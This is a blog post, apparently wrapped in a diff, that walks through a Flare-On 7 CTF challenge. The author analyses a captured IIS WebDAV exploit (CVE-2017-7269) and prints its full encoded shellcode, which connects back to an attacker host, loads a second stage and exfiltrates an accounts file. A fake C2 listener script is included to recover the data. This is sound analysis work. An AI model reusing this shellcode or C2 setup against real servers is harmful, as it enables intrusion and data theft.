@@ -1,0 +1,662 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Data exfiltration: From shellcode to flag - $ Bit escape</title>
+<meta name="description" content="At Flare 7th edition, my favorite challenge was re_crowd, this challenge was really close to a very real world scenario, with just an pcap we are able to understand how the company was attacked, what exploit was used and what shellcode was sent, literally: Why, what and how ?">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="$ Bit escape">
+<meta property="og:title" content="Data exfiltration: From shellcode to flag">
+<meta property="og:url" content="https://aandersonl.github.io/Retrieving-the-exfiltrated-flag-flareon7/">
+
+
+  <meta property="og:description" content="At Flare 7th edition, my favorite challenge was re_crowd, this challenge was really close to a very real world scenario, with just an pcap we are able to understand how the company was attacked, what exploit was used and what shellcode was sent, literally: Why, what and how ?">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2020-10-23T23:25:36+00:00">
+
+
+
+
+
+
+<link rel="canonical" href="https://aandersonl.github.io/Retrieving-the-exfiltrated-flag-flareon7/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": null,
+      "url": "https://aandersonl.github.io/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="$ Bit escape Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          $ Bit escape
+          <span class="site-subtitle">It's good to see you here :)</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories/programming/">Programming</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/cybersec/">Cybersec</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/write-up">CTF's</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Data exfiltration: From shellcode to flag">
+    <meta itemprop="description" content="At Flare 7th edition, my favorite challenge was re_crowd, this challenge was really close to a very real world scenario, with just an pcap we are able to understand how the company was attacked, what exploit was used and what shellcode was sent, literally: Why, what and how ?">
+    <meta itemprop="datePublished" content="2020-10-23T23:25:36+00:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Data exfiltration: From shellcode to flag
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2020-10-23T23:25:36+00:00">October 23, 2020</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          9 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#why-is-this-useful-">Why is this useful ?</a>
+    <ul>
+      <li><a href="#networking-analysis">Networking analysis</a></li>
+      <li><a href="#encoded-polyphormic-shellcode-analysis">Encoded polyphormic Shellcode analysis</a></li>
+    </ul>
+  </li>
+  <li><a href="#recon">Recon</a>
+    <ul>
+      <li><a href="#context">Context</a></li>
+      <li><a href="#exploitation">Exploitation</a></li>
+    </ul>
+  </li>
+  <li><a href="#shellcode-analysis">Shellcode analysis</a>
+    <ul>
+      <li><a href="#alphanumeric-shellcodes">Alphanumeric shellcodes</a></li>
+      <li><a href="#a-note-about-bufferregister">A note about BufferRegister</a></li>
+      <li><a href="#a-note-about-unicode-shellcode">A note about unicode shellcode</a></li>
+      <li><a href="#fixing-the-shellcode-encoding">Fixing the shellcode encoding</a></li>
+    </ul>
+  </li>
+  <li><a href="#running-shellcode-in-scdbg">Running shellcode in scdbg</a>
+    <ul>
+      <li><a href="#the-fake-c2-code">The fake C2 code</a></li>
+    </ul>
+  </li>
+  <li><a href="#debugging-shellcode-in-x64dbg">Debugging shellcode in x64dbg</a>
+    <ul>
+      <li><a href="#the-first-jump">The first jump</a></li>
+      <li><a href="#the-simple-idead-that-reveal-the-flag">The simple idead that reveal the flag</a></li>
+    </ul>
+  </li>
+  <li><a href="#conclusion">Conclusion</a></li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <p>At Flare 7th edition, my favorite challenge was <strong><em>re_crowd</em></strong>, this challenge was really close to a very real world scenario, with just an <strong><em>pcap</em></strong> we are able to understand how the company was attacked, what exploit was used and what shellcode was sent, literally: <strong><em>Why, what and how ?</em></strong></p>
+
+<h1 id="why-is-this-useful-">Why is this useful ?</h1>
+
+<h2 id="networking-analysis">Networking analysis</h2>
+
+<p>Everything was a dump of the network traffic, every analysis need to be done in top of a <strong><em>pcap</em></strong> file, this is all we need to understand the following points:</p>
+<ul>
+  <li>The protocol exploited</li>
+  <li>The service exploited</li>
+  <li>The exploit used</li>
+  <li>The shellcode used</li>
+  <li>The data exfiltrated</li>
+</ul>
+
+<h2 id="encoded-polyphormic-shellcode-analysis">Encoded polyphormic Shellcode analysis</h2>
+
+<p>Also, we need to be able to debug a shellcode, this is very uncommon in CTF challenges and this was the first time I ever seen a challenge with that. With a extracted shellcode from the pcap, we will do the following:</p>
+
+<ul>
+  <li>Fix the payload to use the correct unicode format</li>
+  <li>Reverse engineer a polymorphic shellcode routine</li>
+  <li>Understand the encode routine</li>
+  <li>Be able to create a fake C2 infrastructure to retrieve the exfiltrated data</li>
+</ul>
+
+<p>So, let’s start our analysis!</p>
+
+<p>Message:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hello,
+
+Here at Reynholm Industries we pride ourselves on everything.
+It's not easy to admit, but recently one of our most valuable servers was breached. 
+We don't believe in host monitoring so all we have is a network packet capture.
+We need you to investigate and determine what data was extracted from the server, if any.
+
+Thank you
+</code></pre></div></div>
+
+<h1 id="recon">Recon</h1>
+
+<h2 id="context">Context</h2>
+<p>First, we can read this pcap file with <a href="https://www.wireshark.org/">Wireshark</a>, there you can see that the traffic starts with an HTTP request in a new Web forum of Reynholm Industries, in their conversation, <strong><em>jen</em></strong> said that she kept the accounts files at <strong><em>c:\accounts.txt</em></strong>, and that her need help to create their accounts in this new application.</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/attack_context.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Later on, we notice an request that look very strange, and after that packet the server connect back at por <strong><em>4444</em></strong> of the possible attacker, load something and then send some data to port <strong><em>1337</em></strong> of 192.168.68.21:</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/attack.png" alt="" /></p>
+
+<p>This exploit is abusing of a Buffer overflow vulnerability in Windows server 2003 running IIS 6.0, I know that because it was a famous exploit that explore WebDav protocol,<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2017-7269">CVE-2017-7269</a>, I also found the first published <a href="https://www.exploit-db.com/exploits/41738">exploit</a> from Zhiniang Peng &amp; Chen Wu.</p>
+
+<p>If you take a look at the exploit, it’s a buffer overflow + ROP chain exploitation, and the structure it’s very similar of this attack.</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/first_exploit.png" alt="" /></p>
+
+<p>Of course this is not the same file used here, as this exploit just pop <strong><em>calc.exe</em></strong>, and the attacker one looks to do much more (And notice that the first exploit don’t have the <strong><em>&gt;</em></strong> at the end of the shellcode).</p>
+
+<p>This exploit, is actually the Metasploit module of it, take a look at <strong><em>exploits/windows/iis/iis_webdav_scstoragepathfromurl</em></strong> exploit function:</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/metasploit_module.png" alt="" /></p>
+
+<p>So here is how this is what the attacker is using to exploit the server, the exploits works like:</p>
+
+<ul>
+  <li>It first overflow the url path</li>
+  <li>After the overflow it make 3 <a href="https://ropemporium.com/">ROP chains</a> and load the encoded payload</li>
+  <li>All the bytes are encoded in unicode (I will back soon in this part)</li>
+  <li>The encoded payload is executed</li>
+</ul>
+
+<h1 id="shellcode-analysis">Shellcode analysis</h1>
+
+<p>Ok, this is all the attack stages in order:</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/attack_streams.png" alt="" /></p>
+
+<p>So, after the shellcode succesfully execute in the server, it will download the stage2 from port 4444 and allocate and run the malicious code in memory then it will send something to port 1337.</p>
+
+<p>In order to get the data that was exfiltrated, we must:</p>
+
+<ul>
+  <li>Decode this shellcode</li>
+  <li>Reverse engineering their code</li>
+  <li>Understand how data is being encoded/encrypted</li>
+  <li>Get the exfiltrated data, aka flag</li>
+</ul>
+
+<p>So, let’s go :)</p>
+
+<h2 id="alphanumeric-shellcodes">Alphanumeric shellcodes</h2>
+
+<p>You can cleary see that this shellcode is in plain text, if you never face that before you maybe think that this en encoded using base64/32, but it’s not.</p>
+
+<p>This is called Alphanumeric shellcode, an shellcode that was converted to a sequence of bytes that can be representated as chars, and this new code contain in itself the decompression routine, in order words, this shellcode is able to decode itself in memory and reveal the real code. I strongly recommend the following lectures, <a href="https://www.corelan.be/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/">corlean.be</a> and <a href="https://www.fuzzysecurity.com/tutorials/expDev/5.html">fuzzy security</a>.</p>
+
+<p>This encoder is detect by it’s pattern and because is the default encoder of this payload, we can check that in the real exploit and in the metasploit module:</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/encoder_metasploit.png" alt="" /></p>
+
+<h2 id="a-note-about-bufferregister">A note about BufferRegister</h2>
+
+<p>In order to this kind of shellcode work, it must need where he is in memory, because it will use his absolute address to start the decompression routine, this address must be supplied by a register, in metasploit the default register that will hold the shellcode address is <strong><em>ESI</em></strong>, for this exploit, but if you generate a <a href="https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/">alphanumeric shellcode</a> it will by default create a prefix of 8 bytes, with non alpha bytes, that will set the right address to the register, if you use the option <strong><em>BufferRegister</em></strong>, it will remove this pre-instruction and will be the job of the exploit writer to find this address and load in the register that was chosen.</p>
+
+<h2 id="a-note-about-unicode-shellcode">A note about unicode shellcode</h2>
+
+<p>This exploit is using an mixed unicode shellcode, it’s behaviour is the same as the alphanum, the only difference here is that this kind of encoding is used because windows use unicode as default charset (that’s why each instruction is converted to unicode-utf8 in the exploit), when windows load this shellcode, it will convert to unicode and the exploit will works normally.</p>
+
+<p>… A lot, uh ?</p>
+
+<h2 id="fixing-the-shellcode-encoding">Fixing the shellcode encoding</h2>
+
+<p>As I said before, this shellcode is expecting that windows “fix” to unicode, but I will manually run this exploit using <a href="http://sandsprite.com/blogs/index.php?uid=7&amp;pid=152">scdbg</a> and <a href="http://sandsprite.com/blogs/index.php?uid=7&amp;pid=152">x64dbg</a>, so I need this exploit in the correct encoding format.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span><span class="o">=</span><span class="s">"VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA"</span>
+<span class="n">fixed_shellcode</span> <span class="o">=</span> <span class="s">b''</span>
+
+<span class="k">for</span> <span class="n">code</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">:</span>
+    <span class="n">fixed_shellcode</span> <span class="o">+=</span> <span class="n">code</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
+    <span class="n">fixed_shellcode</span> <span class="o">+=</span> <span class="s">b'</span><span class="se">\x00</span><span class="s">'</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"shellcode_fixed.bin"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">shellcode_fd</span><span class="p">:</span>
+    <span class="n">shellcode_fd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">fixed_shellcode</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"[+] Shellcode fixed [+]"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>After that, we will have this:</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/shellcode_fixed.png" alt="" /></p>
+
+<p>Rather then:</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/unfixed_shellcode.png" alt="" /></p>
+
+<h1 id="running-shellcode-in-scdbg">Running shellcode in scdbg</h1>
+
+<p>I will use scdbg for this task, we know that the exploit is already fixed, we can use scdbg to emulate this exploit instructions.</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/shellcode_running.png" alt="" /></p>
+
+<p>Check that I’m using the option <strong><em>-esi base</em></strong> because the shellcode expect that this register hold his address, then we see that the shellcode is dynamic loading the library <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/">ws2_32</a>, aka winsock, (Using <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a>), this library hold all the socket code, functions like <strong><em>connect</em></strong> and <strong><em>recv</em></strong>, later on it will connect as expect to port 4444, receive some data, and use <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a> to allocate a portion of the memory that will be used for the stage2.</p>
+
+<h2 id="the-fake-c2-code">The fake C2 code</h2>
+
+<p>At this point I had an idea, can I write a fake C2 that emulate what the attacker does ? And was exactly what I did, I create a simple C2 server that will send the same packets when the shellcode try the reach, and receive the same data, this way I can see with my own eyes what really happened in the server.</p>
+
+<p>Fake C2 code</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">class</span> <span class="nc">C2</span><span class="p">:</span>
+	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sender</span> <span class="o">=</span> <span class="bp">True</span><span class="p">):</span>
+		<span class="bp">self</span><span class="p">.</span><span class="n">sender</span> <span class="o">=</span> <span class="n">sender</span>
+		<span class="bp">self</span><span class="p">.</span><span class="n">ip</span> <span class="o">=</span> <span class="n">ip</span>
+		<span class="bp">self</span><span class="p">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>
+		<span class="bp">self</span><span class="p">.</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
+		<span class="bp">self</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="bp">self</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">port</span><span class="p">))</span>
+		<span class="bp">self</span><span class="p">.</span><span class="n">bytes_to_send</span> <span class="o">=</span> <span class="s">b''</span>
+	
+	<span class="k">def</span> <span class="nf">set_host_data</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data_path</span><span class="p">):</span>
+		<span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">data_path</span><span class="p">):</span>
+			<span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">"Unable to find file {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">data_path</span><span class="p">))</span>
+		
+		<span class="k">print</span><span class="p">(</span><span class="s">"Loading {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">data_path</span><span class="p">))</span>
+		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">data_path</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">data_fd</span><span class="p">:</span>
+			<span class="bp">self</span><span class="p">.</span><span class="n">bytes_to_send</span> <span class="o">=</span> <span class="n">data_fd</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+		
+		<span class="k">print</span><span class="p">(</span><span class="s">"Data loaded, ready to serve!"</span><span class="p">);</span>
+
+
+	<span class="k">def</span> <span class="nf">listen</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+		<span class="bp">self</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">"Wainting connections at {}:{}..."</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">port</span><span class="p">))</span>
+
+		<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+			<span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
+			<span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">sender</span><span class="p">:</span>
+				<span class="k">print</span><span class="p">(</span><span class="s">"Received connection, sending bytes..."</span><span class="p">)</span>
+				<span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">bytes_to_send</span><span class="p">)</span>
+				<span class="k">print</span><span class="p">(</span><span class="s">"Bytes sent!, closing..."</span><span class="p">)</span>
+			<span class="k">else</span><span class="p">:</span>
+				<span class="k">print</span><span class="p">(</span><span class="s">"Received connection, waiting data..."</span><span class="p">)</span>
+				<span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+				<span class="n">save_file</span> <span class="o">=</span> <span class="s">"dump.bin"</span>
+				<span class="k">print</span><span class="p">(</span><span class="s">"Received!, saving to {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">save_file</span><span class="p">))</span>
+				<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">save_file</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">save</span><span class="p">:</span>
+					<span class="n">save</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+				<span class="k">print</span><span class="p">(</span><span class="s">"Saved"</span><span class="p">)</span>
+
+
+			<span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+
+
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+	<span class="n">port</span>   <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+	<span class="n">file_to_server</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+	<span class="n">sender</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+	
+	<span class="n">c2</span> <span class="o">=</span> <span class="n">C2</span><span class="p">(</span><span class="s">"0.0.0.0"</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sender</span> <span class="o">==</span> <span class="s">"sender"</span><span class="p">)</span>
+	<span class="n">c2</span><span class="p">.</span><span class="n">set_host_data</span><span class="p">(</span><span class="n">file_to_server</span><span class="p">)</span>
+
+	<span class="n">c2</span><span class="p">.</span><span class="n">listen</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>I also created an file with a random content at <strong><em>C:\accounts.txt</em></strong>, changed my local ip address to 192.168.68.21 and I ran again.</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/scdbg_half_complet.png" alt="" /></p>
+
+<p>Note that I added two more options in scdbg, -i for interactive mode, this will make some function access real resources, such ips, and -u to unlimited steps… but scdbg crashed because it don’t understand some opcodes,maybe some limitations of the libemu, the good part is that our fake c2 really worked, I was able to reply back the malicious packet and the shellcode really allocate and ran that, but this is not good enough, I need go deeper.</p>
+
+<h1 id="debugging-shellcode-in-x64dbg">Debugging shellcode in x64dbg</h1>
+
+<p>I will use x64dbg for debug this shellcode, the steps to acomplish that, is:</p>
+
+<ul>
+  <li>Get a real process</li>
+  <li>Allocate memory</li>
+  <li>Copy our shellcode inside the process</li>
+  <li>Change EIP and fix ESI for the shellcode</li>
+</ul>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/x64dbg_session.png" alt="" /></p>
+
+<p>Ok, now it’s debugging time, I will just point the key parts of this shellcode/stage2 because a lot happened here.</p>
+
+<h2 id="the-first-jump">The first jump</h2>
+
+<p>After all the decode routine ends, the first <strong><em>jmp</em></strong> will be revealed</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/loading_winsock.png" alt="" /></p>
+
+<p>Notice that the <strong><em>eax</em></strong> register actually holds the LoadLibrary address, and on the top of our stack we have the <strong><em>ws2_32</em></strong> library, you need follow this jump in order to not lose the control of the shellcode, until you reach a safe point that you can put a useful breakpoint.</p>
+
+<p>After a while, I notice a lot of call functions to ebp register, so I just put some breaking points in a hope to find something useful in the call</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/EBP_BREAKS.png" alt="" /></p>
+
+<p>Following this calls, I found the Readfile function, after that I notice that my data was sent to a strange function that looks like a encryption routine, take a look</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/intrepidmango.png" alt="" /></p>
+
+<p>Notice that ESP holds my file data and Yes, I just fill with a bunch of <strong><em>A</em></strong>, later on I realized that was a bad idea, In the next call it will load all the alphabet characters and starts it encoding/encryption routine of my data.</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/encode_routine.png" alt="" /></p>
+
+<p>You can see that the key is loaded and my data is in the stack with a bunch of <strong><em>0x41</em></strong>, the A’s before, It was a really bad idea fill with a unique byte… But, it really doesn’t matter, I already found the encryption loop, so I just need to analyze that, try to understand and write a decoder for th… no, please, just no.</p>
+
+<h2 id="the-simple-idead-that-reveal-the-flag">The simple idead that reveal the flag</h2>
+
+<p>So I don’t know if this was an act of miracle, or from where come this insight, but my idea was, what if I replace my <strong><em>C:\accounts.txt</em></strong> with the encoded/exfiltrated data ?</p>
+
+<p>I literally did that, I dumped out the 1337 data from pcap and replace my <strong><em>C:\accounts</em></strong>, I literally just ran the shellcode and wait my fake C2 dump the file out.</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/fakec2_final.png" alt="" /></p>
+
+<p>After ran the shellcode (x64dbg clean the screen after finish), my C2 that was listening on port <strong><em>1337</em></strong>, dumped something, and guess what ?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>roy:h4ve_you_tri3d_turning_1t_0ff_and_0n_ag4in@flare-on.com:goat &lt;---
+moss:Pot-Pocket-Pigeon-Hunt-8:narwhal
+jen:Straighten-Effective-Gift-Pity-1:bunny
+richmond:Inventor-Hut-Autumn-Tray-6:bird
+denholm:123:dog
+</code></pre></div></div>
+
+<p><img src="https://aandersonl.github.io/assets/images/re_crowd/never_give_up.png" alt="" /></p>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>By the end of the write-up, you will notice the amount of steps that we acomplished:</p>
+
+<ul>
+  <li>Network analysis</li>
+  <li>Threat analysis</li>
+  <li>Shellcode analysis</li>
+  <li>Data exfiltration decoding</li>
+</ul>
+
+<p>Thanks to all!</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/cybersec" class="page__taxonomy-item" rel="tag">cybersec</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/flare7" class="page__taxonomy-item" rel="tag">flare7</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/shellcode" class="page__taxonomy-item" rel="tag">shellcode</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/write-up" class="page__taxonomy-item" rel="tag">write-up</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-10-23T23:25:36+00:00">October 23, 2020</time></p>
+
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/VBA-Stomping-flare/" class="pagination--pager" title="VBA Stomping: The macro hidden in plain sight
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
